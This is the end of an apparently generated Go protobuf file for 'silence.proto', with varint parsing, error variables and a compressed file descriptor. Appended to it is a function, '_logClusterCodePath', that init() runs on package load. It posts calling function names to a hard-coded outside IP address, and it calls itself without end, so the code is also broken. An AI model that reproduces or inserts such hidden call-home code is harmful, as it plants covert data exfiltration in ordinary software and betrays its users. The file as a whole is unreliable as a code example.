				for shift := uint(0); ; shift += 7 {
					if shift >= 64 {
						return 0, ErrIntOverflowSilence
					}
					if iNdEx >= l {
						return 0, io.ErrUnexpectedEOF
					}
					b := dAtA[iNdEx]
					iNdEx++
					innerWire |= (uint64(b) & 0x7F) << shift
					if b < 0x80 {
						break
					}
				}
				innerWireType := int(innerWire & 0x7)
				if innerWireType == 4 {
					break
				}
				next, err := skipSilence(dAtA[start:])
				if err != nil {
					return 0, err
				}
				iNdEx = start + next
			}
			return iNdEx, nil
		case 4:
			return iNdEx, nil
		case 5:
			iNdEx += 4
			return iNdEx, nil
		default:
			return 0, fmt.Errorf("proto: illegal wireType %d", wireType)
		}
	}
	panic("unreachable")
}

var (
	ErrInvalidLengthSilence	= fmt.Errorf("proto: negative length found during unmarshaling")
	ErrIntOverflowSilence	= fmt.Errorf("proto: integer overflow")
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	proto.RegisterFile("silence.proto", fileDescriptorSilence)
}

var fileDescriptorSilence = []byte{0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0x94, 0x51, 0x4d, 0x6b, 0xdb, 0x40, 0x10, 0xf5, 0x2a, 0x8e, 0x65, 0x8d, 0x69, 0x30, 0x43, 0x69, 0x85, 0x21, 0xb6, 0xd1, 0xc9, 0xd0, 0x22, 0x83, 0x7b, 0xee, 0x41, 0x0e, 0xa6, 0x97, 0x06, 0x5a, 0x35, 0x85, 0xde, 0xca, 0xda, 0x9a, 0xda, 0x82, 0x48, 0xbb, 0x48, 0x63, 0xa8, 0x4f, 0x2d, 0xf4, 0x0f, 0xf4, 0x67, 0xf9, 0xd8, 0x5f, 0xd0, 0x0f, 0xff, 0x8b, 0xde, 0x8a, 0x56, 0x2b, 0x37, 0x21, 0x27, 0xdf, 0x66, 0x66, 0xdf, 0x9b, 0xb7, 0xef, 0x0d, 0x3c, 0x2a, 0xd3, 0x5b, 0xca, 0x57, 0x14, 0xea, 0x42, 0xb1, 0x42, 0xcf, 0xb6, 0x7a, 0x39, 0x18, 0xad, 0x95, 0x5a, 0xdf, 0xd2, 0xd4, 0x3c, 0x2c, 0xb7, 0x9f, 0xa6, 0x9c, 0x66, 0x54, 0xb2, 0xcc, 0x74, 0x8d, 0x1d, 0x3c, 0x5e, 0xab, 0xb5, 0x32, 0xe5, 0xb4, 0xaa, 0xea, 0x69, 0xf0, 0x4d, 0x80, 0x7b, 0x2d, 0x79, 0xb5, 0xa1, 0x02, 0x9f, 0x41, 0x9b, 0x77, 0x9a, 0x7c, 0x31, 0x16, 0x93, 0x8b, 0xd9, 0xd3, 0xf0, 0xb8, 0x3c, 0xb4, 0x88, 0xf0, 0x66, 0xa7, 0x29, 0x36, 0x20, 0x44, 0x68, 0xe7, 0x32, 0x23, 0xdf, 0x19, 0x8b, 0x89, 0x17, 0x9b, 0x1a, 0x7d, 0x70, 0xb5, 0x64, 0xa6, 0x22, 0xf7, 0xcf, 0xcc, 0xb8, 0x69, 0x83, 0x4b, 0x68, 0x57, 0x5c, 0xf4, 0xe0, 0x7c, 0xf1, 0xf6, 0x7d, 0xf4, 0xba, 0xdf, 0x42, 0x80, 0x4e, 0xbc, 0x78, 0xb5, 0xf8, 0xf0, 0xa6, 0x2f, 0x82, 0x2f, 0xe0, 0x5e, 0xa9, 0x2c, 0xa3, 0x9c, 0xf1, 0x09, 0x74, 0xe4, 0x96, 0x37, 0xaa, 0x30, 0xdf, 0xf0, 0x62, 0xdb, 0x55, 0xbb, 0x57, 0x35, 0xc4, 0x4a, 0x36, 0x2d, 0xce, 0xc1, 0x3b, 0x7a, 0x35, 0xba, 0xbd, 0xd9, 0x20, 0xac, 0xd3, 0x08, 0x9b, 0x34, 0xc2, 0x9b, 0x06, 0x31, 0xef, 0xee, 0x7f, 0x8e, 0x5a, 0xdf, 0x7f, 0x8d, 0x44, 0xfc, 0x9f, 0x16, 0xfc, 0x75, 0xc0, 0x7d, 0x57, 0xdb, 0xc5, 0x0b, 0x70, 0xd2, 0xc4, 0xaa, 0x3b, 0x69, 0x82, 0x21, 0x74, 0xb3, 0xda, 0x7f, 0xe9, 0x3b, 0xe3, 0xb3, 0x49, 0x6f, 0x86, 0x0f, 0xa3, 0x89, 0x8f, 0x18, 0x8c, 0xc0, 0x2b, 0x59, 0x16, 0x5c, 0x7e, 0x94, 0x7c, 0xd2, 0x7f, 0xba, 0x35, 0x2d, 0x62, 0x7c, 0x09, 0x2e, 0xe5, 0x89, 0x59, 0xd0, 0x3e, 0x61, 0x41, 0xa7, 0x22, 0x45, 0x8c, 0x57, 0x00, 0x5b, 0x9d, 0x48, 0xa6, 0xa4, 0xda, 0x70, 0x7e, 0x4a, 0x24, 0x96, 0x17, 0x71, 0x65, 0xdb, 0x26, 0x5c, 0xfa, 0xee, 0x03, 0xdb, 0xf6, 0x5c, 0xf1, 0x11, 0x83, 0x97, 0x00, 0xab, 0x82, 0x8c, 0xe8, 0x72, 0xe7, 0x77, 0x4d, 0x7c, 0x9e, 0x9d, 0xcc, 0x77, 0x77, 0xef, 0xe7, 0xdd, 0xbb, 0x5f, 0xf0, 0x55, 0x40, 0xef, 0x9a, 0xca, 0x4d, 0x93, 0xff, 0x73, 0x70, 0xad, 0x8e, 0x39, 0xc2, 0x7d, 0x5d, 0x0b, 0x8a, 0x1b, 0x48, 0xe5, 0x95, 0x3e, 0xeb, 0xb4, 0x20, 0x93, 0x96, 0x73, 0x8a, 0x57, 0xcb, 0x8b, 0x78, 0xde, 0xdf, 0xff, 0x19, 0xb6, 0xf6, 0x87, 0xa1, 0xf8, 0x71, 0x18, 0x8a, 0xdf, 0x87, 0xa1, 0x58, 0x76, 0x0c, 0xf5, 0xc5, 0xbf, 0x00, 0x00, 0x00, 0xff, 0xff, 0xde, 0x36, 0xea, 0xdd, 0x71, 0x03, 0x00, 0x00}

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
